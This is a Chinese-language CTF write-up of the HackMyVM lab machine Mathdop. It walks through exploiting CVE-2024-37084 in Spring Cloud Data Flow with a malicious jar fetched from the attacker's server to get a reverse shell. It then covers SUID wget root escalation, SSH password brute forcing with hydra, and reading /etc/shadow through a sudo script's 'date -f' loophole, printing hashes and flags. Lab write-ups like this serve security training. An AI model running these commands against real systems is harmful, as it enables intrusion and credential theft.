{"pageProps":{"postData":{"id":"HackMyVMMathdop","contentHtml":"<h1>Mathdop.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Mathdop\">https://hackmyvm.eu/machines/machine.php?vm=Mathdop</a></p>\n</blockquote>\n<p>Notes：<strong>Have fun！</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Mathdop nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 04:42 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00054s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:2F:F3:93 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.52\nHost is up (0.00041s latency).\nMAC Address: 08:00:27:A2:D9:84 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.53\nHost is up (0.00053s latency).\nMAC Address: 08:00:27:F0:21:7B (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (5 hosts up) scanned <span class=\"hljs-keyword\">in</span> 15.05 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mathdop nmap -sT -min-rate 10000 -p- 192.168.56.53       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 04:43 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.53\nHost is up (0.0061s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n7577/tcp open  unknown\n9393/tcp open  unknown\nMAC Address: 08:00:27:F0:21:7B (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.78 seconds\n</code></pre>\n<p><code>7577</code> 和 <code>9393</code> 都是和 <code>Spring Cloud Data Flow</code> 有关的</p>\n<h2>Spring Cloud Data Flow</h2>\n<p>在 <a href=\"http://192.168.56.53:9393/about\">http://192.168.56.53:9393/about</a> 中能找到版本信息 2.11.3</p>\n<p>该版本存在远程命令执行漏洞</p>\n<p>POC 链接：<a href=\"https://github.com/XiaomingX/cve-2024-37084-Poc?tab=readme-ov-file\">https://github.com/XiaomingX/cve-2024-37084-Poc?tab=readme-ov-file</a></p>\n<p>构建恶意 Payload 的 yaml 文件工具：<a href=\"https://github.com/artsploit/yaml-payload?tab=readme-ov-file\">https://github.com/artsploit/yaml-payload?tab=readme-ov-file</a></p>\n<h3>生成恶意 Payload 的 yaml 文件</h3>\n<ol>\n<li>\n<p>克隆 <a href=\"https://github.com/artsploit/yaml-payload?tab=readme-ov-file\">https://github.com/artsploit/yaml-payload?tab=readme-ov-file</a> 的仓库</p>\n</li>\n<li>\n<p>修改 <code>payload</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop vim yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java\n</code></pre>\n<p><img src=\"/post-images/HackMyVMMathdop/image.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>打包</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop /usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java\n➜  Mathdop jar -cvf givemeshell.jar -C yaml-payload/src/ .                                           \n</code></pre>\n</li>\n<li>\n<p>开启恶意服务器</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop python -m http.server 8080\n</code></pre>\n</li>\n</ol>\n<h3>漏洞利用</h3>\n<ol>\n<li>\n<p>开启监听</p>\n</li>\n<li>\n<p>运行</p>\n<pre><code class=\"hljs language-bash\">python CVE-2024-37084-Poc.py --target_url http://192.168.56.53:7577/api/package/upload --version 5.0.0 --payload_url http://192.168.56.4:8080/givemeshell.jar --listen_ip 192.168.56.4 --listen_port 1234\n</code></pre>\n<p><img src=\"/post-images/HackMyVMMathdop/image1.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>接收到 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.53: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.53] 51926\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (1): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\ncnb@921567b128b2:/workspace$ \n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<h3>Docker 逃逸</h3>\n<p>是在容器里面，并且 <code>cnb</code> 家目录中能找到 <code>note</code> 文件</p>\n<pre><code class=\"hljs language-bash\">cnb@921567b128b2:~$ <span class=\"hljs-built_in\">cat</span> note\n<span class=\"hljs-built_in\">cat</span> note\nHi mathlake\nLong <span class=\"hljs-keyword\">time</span> no see, 256 is my favorite number. I know you are very interested <span class=\"hljs-keyword\">in</span> mathematics, but I have been struggling with a math problem recently. The method used is <span class=\"hljs-keyword\">time</span> series decomposition. I have sent you the data, and you can provide me with the mathematical expressions <span class=\"hljs-keyword\">for</span> T, S, and C (rounded to the nearest <span class=\"hljs-built_in\">integer</span>) corresponding to the month.\nJune 2025\n</code></pre>\n<p>是一道数学题，需要提供 T，S，C</p>\n<pre><code class=\"hljs language-bash\">你好，mathlake\n好久不见，256 是我最喜欢的数字。我知道你对数学很感兴趣，但我最近一直在苦苦思索一道数学题。我用的方法是时间序列分解。我已经把数据发给你了，你可以提供对应月份的 T、S 和 C 的数学表达式（四舍五入到最接近的整数）。\n2025 年 6 月\n</code></pre>\n<p>然后在 <code>/var/mail</code> 中能找到 <code>mathlake</code>，但是 <code>cnb</code> 用户咩办法读取</p>\n<p>查看 <code>SUID</code> 情况</p>\n<pre><code class=\"hljs language-bash\">cnb@921567b128b2:/$ find -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null                                                           \nfind -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null                                                                               \n./bin/mount                                                                                                       \n./bin/su                                                                                                          \n./bin/umount                                                                                                      \n./usr/bin/chfn                                                                                                    \n./usr/bin/chsh                                                                                                    \n./usr/bin/gpasswd                                                                                                 \n./usr/bin/newgrp                                                                                                  \n./usr/bin/passwd                                                                                                  \n./usr/local/bin/wget  \n</code></pre>\n<pre><code class=\"hljs language-bash\">TF=$(<span class=\"hljs-built_in\">mktemp</span>)\n<span class=\"hljs-built_in\">chmod</span> +x <span class=\"hljs-variable\">$TF</span>\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">'#!/bin/bash -p\\n/bin/bash -p 1>&#x26;0'</span> ><span class=\"hljs-variable\">$TF</span>\nwget --use-askpass=<span class=\"hljs-variable\">$TF</span> 0\n\n<span class=\"hljs-built_in\">id</span>\nuid=1000(cnb) gid=1000(cnb) euid=0(root) egid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root),1000(cnb)\n<span class=\"hljs-built_in\">cd</span> /root\n</code></pre>\n<p>应该不是 <code>Docker</code> 逃逸，因为 <code>Note</code> 的信息。然后之前在根据信息（I have sent you the data）在邮件中找到了<code>mathlake</code> ，但是之前没权限读不了，现在提升权限后就可以读了。</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">ls</span>\ndata.xlsx\ntest.png\ntrue.png\n</code></pre>\n<p>其中 <code>data.xlsx</code> 是我们需要的文件</p>\n<p><img src=\"/post-images/HackMyVMMathdop/image2.png\" alt=\"image.png\"></p>\n<p>这里开始就是数学题了…不会，直接喂给 <code>GPT</code> 了</p>\n<p><img src=\"/post-images/HackMyVMMathdop/image3.png\" alt=\"image.png\"></p>\n<p>给出了范围那么我们就写脚本来进行爆破，并且（256 是我最喜欢的数字）指的是结果需要使用<code>sha256</code>进行加密，再次佩服首杀的群友。</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop <span class=\"hljs-built_in\">cat</span> brute.sh      \n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> {54..56};<span class=\"hljs-keyword\">do</span>\n        <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> {-3..4};<span class=\"hljs-keyword\">do</span>\n                <span class=\"hljs-keyword\">for</span> k <span class=\"hljs-keyword\">in</span> {0..1};<span class=\"hljs-keyword\">do</span>\n                        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$i</span>*<span class=\"hljs-variable\">$j</span>*<span class=\"hljs-variable\">$k</span>\"</span>|<span class=\"hljs-built_in\">sha256sum</span>|awk <span class=\"hljs-string\">'{print $1}'</span>;\n                <span class=\"hljs-keyword\">done</span>\n        <span class=\"hljs-keyword\">done</span>\n<span class=\"hljs-keyword\">done</span>\n\n➜  Mathdop ./brute.sh > pass.txt\n</code></pre>\n<p>然后将脚本生成密码进行 <code>SSH</code> 爆破，使用 mathlake 作为用户名，在<code>note</code>中可以得到</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop hydra -l mathlake -P pass.txt -t 12 192.168.56.53 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-24 06:01:41\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 48 login tries (l:1/p:48), ~4 tries per task\n[DATA] attacking ssh://192.168.56.53:22/\n[22][ssh] host: 192.168.56.53   login: mathlake   password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 1 final worker threads did not complete <span class=\"hljs-keyword\">until</span> end.\n[ERROR] 1 target did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-24 06:01:48                                                                                            \n</code></pre>\n<p>成功得到密码</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop ssh mathlake@192.168.56.53  \nmathlake@192.168.56.53<span class=\"hljs-string\">'s password: \nLast failed login: Thu Apr 24 18:01:47 CST 2025 from 192.168.56.4 on ssh:notty\nThere were 63 failed login attempts since the last successful login.\nLast login: Sun Mar 30 18:43:26 2025\n[mathlake@mathdop ~]$\n</span></code></pre>\n<h3>root</h3>\n<p>查看权限，可以以 <code>root</code> 权限执行 <code>/opt/secure_input_handler.sh</code></p>\n<pre><code class=\"hljs language-bash\">[mathlake@mathdop ~]$ <span class=\"hljs-built_in\">sudo</span> -l\n匹配 %2<span class=\"hljs-variable\">$s</span> 上 %1<span class=\"hljs-variable\">$s</span> 的默认条目：\n    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=<span class=\"hljs-string\">\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\"</span>, env_keep+=<span class=\"hljs-string\">\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\"</span>,\n    env_keep+=<span class=\"hljs-string\">\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\"</span>, env_keep+=<span class=\"hljs-string\">\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\"</span>, env_keep+=<span class=\"hljs-string\">\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\"</span>,\n    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\n\n用户 mathlake 可以在 mathdop 上运行以下命令：\n    (ALL) NOPASSWD: /opt/secure_input_handler.sh\n</code></pre>\n<pre><code class=\"hljs language-bash\">[mathlake@mathdop ~]$ <span class=\"hljs-built_in\">sudo</span> /opt/secure_input_handler.sh \nInput Command: <span class=\"hljs-built_in\">ls</span>\ncol: 无效或不完整的多字节字符或宽字符\n[!] Decoding failed or input is too long\n[mathlake@mathdop ~]$ <span class=\"hljs-built_in\">sudo</span> /opt/secure_input_handler.sh \nInput Command: <span class=\"hljs-built_in\">whoami</span>\ncol: 无效或不完整的多字节字符或宽字符\n[!] Decoding failed or input is too long\n</code></pre>\n<p>查看一下源代码</p>\n<pre><code class=\"hljs language-bash\">[mathlake@mathdop ~]$ <span class=\"hljs-built_in\">cat</span> /opt/secure_input_handler.sh \n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/usr/bin\"</span>\n\n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"Input Command: \"</span> user_input\n\ndecoded_input=$(<span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$user_input</span>\"</span> | <span class=\"hljs-built_in\">base64</span> -d 2>/dev/null | <span class=\"hljs-built_in\">tr</span> -d <span class=\"hljs-string\">'\\r\\0\\a'</span> | col -b)\n<span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#user_input}</span> -gt 128 || -z <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$decoded_input</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[!] Decoding failed or input is too long\"</span> >&#x26;2\n    <span class=\"hljs-built_in\">exit</span> 2\n<span class=\"hljs-keyword\">fi</span>\n\nfiltered_input=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$decoded_input</span>\"</span> | <span class=\"hljs-built_in\">tr</span> -<span class=\"hljs-built_in\">cd</span> <span class=\"hljs-string\">'a-zA-Z0-9\\-_/ :.'</span> | sed -e <span class=\"hljs-string\">'s/[[:space:]]\\+/ /g'</span> -e <span class=\"hljs-string\">'s/^[ \\t]*//'</span> -e <span class=\"hljs-string\">'s/[ \\t]*$//'</span>)\n\nIFS=<span class=\"hljs-string\">' '</span> <span class=\"hljs-built_in\">read</span> -ra cmd_args &#x3C;&#x3C;&#x3C; <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$filtered_input</span>\"</span>\n<span class=\"hljs-built_in\">command</span>=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${cmd_args[0]}</span>\"</span>\ncommand_clean=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$command</span>\"</span> | <span class=\"hljs-built_in\">tr</span> -d -c <span class=\"hljs-string\">'a-zA-Z0-9'</span>)\n\nallowed_commands=(<span class=\"hljs-string\">\"date\"</span> <span class=\"hljs-string\">\"pwd\"</span> <span class=\"hljs-string\">\"echo\"</span>)\n<span class=\"hljs-keyword\">if</span> ! <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${allowed_commands[@]}</span>\"</span> | grep -qxF <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$command_clean</span>\"</span>; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[!] Illegal instruction: <span class=\"hljs-variable\">$command_clean</span>\"</span> >&#x26;2\n    <span class=\"hljs-built_in\">exit</span> 3\n<span class=\"hljs-keyword\">fi</span>\n\n/usr/bin/timeout 2 /usr/bin/bash -c <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${filtered_input}</span>\"</span>\n</code></pre>\n<ul>\n<li><strong>路径设置</strong>：\n<ul>\n<li>脚本将 <code>PATH</code> 环境变量设置为 <code>/usr/bin</code>，确保只使用该目录中的可执行文件。</li>\n</ul>\n</li>\n<li><strong>用户输入</strong>：\n<ul>\n<li>脚本提示用户输入（<code>user_input</code>），输入内容预期为 base64 编码的命令。</li>\n</ul>\n</li>\n<li><strong>解码</strong>：\n<ul>\n<li>使用 <code>base64 -d</code> 解码用户输入。如果解码失败（如输入无效或命令过长），脚本会显示错误信息并退出。</li>\n<li>解码后，脚本通过 <code>tr -d '\\r\\0\\a'</code> 删除回车、空字符和响铃字符，并使用 <code>col -b</code> 规范化换行符。</li>\n</ul>\n</li>\n<li><strong>输入清理</strong>：\n<ul>\n<li>通过 <code>tr -cd 'a-zA-Z0-9\\-_/ :.'</code> 过滤掉不允许的字符，只保留字母、数字、破折号、下划线、斜杠、冒号和点。</li>\n<li>使用 <code>sed</code> 去除多余的空格，将多个空格替换为一个，并去除行首和行尾的空白字符。</li>\n</ul>\n</li>\n<li><strong>命令检查</strong>：\n<ul>\n<li>将清理后的输入拆分为命令和参数（使用空格分隔）。</li>\n<li>只允许 <code>date</code>、<code>pwd</code> 和 <code>echo</code> 这三个命令执行。通过检查命令是否在 <code>allowed_commands</code> 数组中来确保其合法性。</li>\n<li>如果命令不在允许的列表中，脚本会显示非法指令的错误信息并退出。</li>\n</ul>\n</li>\n<li><strong>执行命令</strong>：\n<ul>\n<li>如果命令合法，脚本会使用 <code>/usr/bin/timeout 2</code> 限制命令执行时间为 2 秒，然后通过 <code>/usr/bin/bash</code> 执行过滤后的命令。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>可以使用 <code>Date</code> 命令，<code>Date</code> 是可以用来读取文件的</p>\n<p><img src=\"/post-images/HackMyVMMathdop/image4.png\" alt=\"image.png\"></p>\n<p>读取 <code>/etc/shadow</code></p>\n<pre><code class=\"hljs language-bash\">[mathlake@mathdop etc]$ <span class=\"hljs-built_in\">sudo</span> /opt/secure_input_handler.sh\nInput Command: ZGF0ZSAtZiAvZXRjL3NoYWRvdwo=\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"# Worth waiting for\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"# 9e9feaf74138c66fbaadba5a9da259c5\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"root:$6<span class=\"hljs-variable\">$WUx</span>.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"bin:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"daemon:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"adm:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"lp:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"sync:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"shutdown:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"halt:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"mail:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"operator:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"games:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"ftp:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"nobody:*:18353:0:99999:7:::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"systemd-network:!!:20157::::::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"dbus:!!:20157::::::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"polkitd:!!:20157::::::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"sshd:!!:20157::::::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"postfix:!!:20157::::::\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"mathlake:$6$XdfsxCCu<span class=\"hljs-variable\">$sHnJOhJpbvkbW</span>/aLnCE/4QyYVYW0j2DNSByRxiJ2pLuFJkXi8Yk.wD33.SEUxtTuZ3z1xYqchgilvmX2yzZsq.:20177:0:99999:7:::\"</span>\n</code></pre>\n<p>“值得等待”，可能是要进行爆破</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"# Worth waiting for\"</span>\n<span class=\"hljs-built_in\">date</span>: 无效的日期<span class=\"hljs-string\">\"# 9e9feaf74138c66fbaadba5a9da259c5\"</span>\n</code></pre>\n<p>没爆破出来，尝试一下爆破加密一下</p>\n<pre><code class=\"hljs language-bash\">root:$6<span class=\"hljs-variable\">$WUx</span>.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::\n</code></pre>\n<p>Cracking</p>\n<pre><code class=\"hljs language-bash\">➜  Mathdop john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt pass\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 16 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n0g 0:00:20:22 DONE (2025-04-24 06:56) 0g/s 11729p/s 11729c/s 11729C/s !&#x26;!!!(^*..*7¡Vamos!\nSession completed. \n</code></pre>\n<p>挂了两节课没破解出来</p>\n<p><img src=\"/post-images/HackMyVMMathdop/THINKING-3x.gif\" alt=\"THINKING-3x.gif\"></p>\n<p>最后看 <code>WP</code> 后发现 “<code>Worth waiting for</code>” 是密码</p>\n<p><img src=\"/post-images/HackMyVMMathdop/image5.png\" alt=\"image.png\"></p>\n<p>最后读取 <code>user.txt</code> 和 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">\n[root@mathdop mathlake]# <span class=\"hljs-built_in\">cat</span> user.txt \nflag{d79b3daf297f1ad136284d93900c0fe8543a52eb}\n\n[root@mathdop ~]# <span class=\"hljs-built_in\">cat</span> r00000000000000000000000000000000000000000000000000000t.txt \nflag{29975f78aafc266eaa88520357552917d1164964}\n</code></pre>\n<h2>总结</h2>\n<p>获得初始立足点的 CVE 和之前碰到的 <code>Nacos Client Yaml</code> 反序列化很像（一模一样），所以没这么卡在开始。</p>\n<p>第二部分数学题，真的不会，没学过数学了，然后就卡住了…</p>","title":"HackMyVM - Mathdop","date":"2025-04-24","updated":"2025-04-24","comments":true,"tags":["Linux靶机","HackMyVM","Spring","数学"],"categories":"靶机","description":"Mathdop.\n\n https://hackmyvm.eu/machines/machine.php?vm=Mathdop\n \n\nNotes：Have fun！\n\n前期踩点\n\n\n\n\n\n`7577` 和 `9393` 都是和 `Spring Cloud Data Flow` 有关的\n\nSpring Cloud Data Flow\n\n在 http://192.168.56.53:9393/about..."},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true}